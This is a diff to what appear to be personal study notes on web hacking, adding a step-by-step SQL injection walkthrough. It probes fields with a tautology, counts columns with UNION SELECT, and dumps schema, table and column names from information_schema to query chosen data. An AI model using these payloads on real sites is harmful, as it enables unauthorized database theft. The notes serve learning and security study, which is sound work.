@@ -182,7 +182,7 @@
     - Find suspicious Java script function
     - Run functions in console that you find inspect code
 
---------------------------------------- x
+--------------------------------------- 
 ### Cross-Site Scripting (XSS)
   -Types: Reflected vs. Stored
 #### Stored XSS
@@ -252,6 +252,7 @@
 ## SQL (Injections) - AKA Structured Query Language
   - Create SQL queries
   - Perform SQL Injections through GET & POST http commands
+  - INPUTTING is POST, SELECTING IS GET
 ### Standard SQL Commands
   - SELECT
   - UNION
@@ -266,5 +267,51 @@
      - 6. Turn on Raw to turn POST into ONE line ( Called Request payload (should be one line)
      - 7. Copy string, add ? to URL to intialize variable and PASTE string into URL and press ENTER
       -8. Whatever the output, View Page Source
+
+### SQL Inject Golden Rule Demo
+     - 1. Golden Statement
+       - table_schema,table_name,column_name from information_schema.columns
+       - <NAME OF COLUMN>,<NAME OF COLUMN>,<NAME OF COLUMN> from <NAME OF DATABASE>,<NAME OF TABLE>
+
+     - 2. Access SQL DBL
+       -run: mysql
+       
+     - 3. Show databases - THREE DEFAULT DATABASES (information_schema, mysql, perfofrmance_schema)
+       -run: show databases ;
+
+     - 4. Run golden statement
+       -run: select table_schema,table_name,column_name from information_schema.columns ;
+
+     - 5. Manuever into infoschema DB
+       -run: use information_schema  ;
+
+     - 6. Output tables
+       -run: show tables ;
+
+     - 7. Output columns 
+       -run: show columns from columns ;
+       -Should now output table_schema, table_name, column_name
+
+  #### SQL INJECTION  on website
+
+     -1. Identify vulnerable field/selection
+       -Use truth statement ( tom' OR 1='1 ) while replacing "tom" with the Selections given
+       -Basically seeing what still works WHILE using selection names, what does not have input sanitization
+
+     -2. Identify # of columns, utilize UNION SELECT
+       - vulnerableselectionname' UNION SELECT 1,2,3,4 #
+       - If didnt work, add another number
+       - vulnerableselectionname' UNION SELECT 1,2,3,4,5 #
+
+     -3. Edit Golden Statement- ONLY CHANGE: 2 = column we cant see, 5 = total amount of columns you can query ( IMPORTANT )
+       - INPUT: vulnerableselectionname' UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns #
+       - MAKE SURE TO REPLACE THE ( 1,2,3,4,5 # ) in last command with GOLDEN STATEMENT
+       - Should OUTPUT ENTIRE DATABASE
+       - KEEP TRACK OF TABLE FOR CRAFTING QUERIES
+       -Database            Table               Column
+
+      -4. Craft our queries |  2 = column we cant see
+       -vulnerableselectionname' UNION SELECT nameofcyouwant,2,nameofc,nameofc,nameofc from database.Table
+
 
       
